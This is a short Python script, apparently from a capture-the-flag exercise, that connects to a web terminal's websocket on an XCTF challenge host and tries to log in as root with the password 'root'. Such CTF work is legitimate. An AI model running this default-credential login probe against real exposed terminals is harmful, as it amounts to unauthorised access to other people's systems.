import time, websocket
URL='ws://oj-10-30-15-9-46057.adworld.xctf.org.cn/ws'
ORIGIN='http://oj-10-30-15-9-46057.adworld.xctf.org.cn'

def recv_until(ws, markers, timeout=12):
    end=time.time()+timeout
    buf=''
    while time.time()<end:
        ws.settimeout(1)
        try:
            data=ws.recv()
        except Exception:
            continue
        if isinstance(data,(bytes,bytearray)):
            data=data.decode('utf-8','ignore')
        if not data:
            continue
        if data[0]=='0':
            buf+=data[1:]
        if any(m in buf for m in markers):
            break
    return buf

ws=websocket.create_connection(URL, subprotocols=['tty'], timeout=10, origin=ORIGIN)
ws.send('{"columns":160,"rows":40}')
print(recv_until(ws,['login:'],5))
ws.send('0root\n')
print(recv_until(ws,['Password:','Login incorrect',':~# ',':~$ '],8))
ws.send('0root\n')
print(recv_until(ws,['Login incorrect',':~# ',':~$ '],12))
ws.close()
